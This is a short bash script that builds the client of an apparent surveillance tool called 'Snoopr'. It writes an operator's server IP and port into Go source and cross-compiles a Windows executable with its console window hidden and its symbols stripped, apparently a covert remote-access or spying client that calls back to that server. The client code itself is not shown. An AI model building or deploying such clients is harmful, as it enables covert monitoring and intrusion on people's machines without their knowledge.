#!/bin/bash

echo "========================================"
echo "         Snoopr Client Builder"
echo "========================================"

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 [SERVER_IP] [SERVER_PORT]"
    echo "Example: $0 192.168.1.100 8080"
    exit 1
fi

SERVER_IP=$1
SERVER_PORT=$2

echo "Building client for server: $SERVER_IP:$SERVER_PORT"

# Download dependencies
echo "Installing Go dependencies..."
go mod tidy

# Create temporary client file with server details
echo "Creating client configuration..."
CLIENT_FILE="cmd/client/main_build.go"
cp cmd/client/main.go $CLIENT_FILE

# Replace placeholders with actual values
sed -i.bak "s/SERVER_IP_PLACEHOLDER/$SERVER_IP/g" $CLIENT_FILE
sed -i.bak "s/SERVER_PORT_PLACEHOLDER/$SERVER_PORT/g" $CLIENT_FILE

# Build the client for Windows (cross-compile from Unix)
echo "Building Windows executable..."
GOOS=windows GOARCH=amd64 go build -ldflags="-H windowsgui -s -w" -o bin/snoopr-client.exe $CLIENT_FILE

# Cleanup
rm $CLIENT_FILE
rm -f $CLIENT_FILE.bak

if [ -f "bin/snoopr-client.exe" ]; then
    echo ""
    echo "========================================"
    echo "Build successful!"
    echo "Client executable: bin/snoopr-client.exe"
    echo "Server: $SERVER_IP:$SERVER_PORT"
    echo "========================================"
else
    echo ""
    echo "========================================"
    echo "Build failed!"
    echo "========================================"
    exit 1
fi 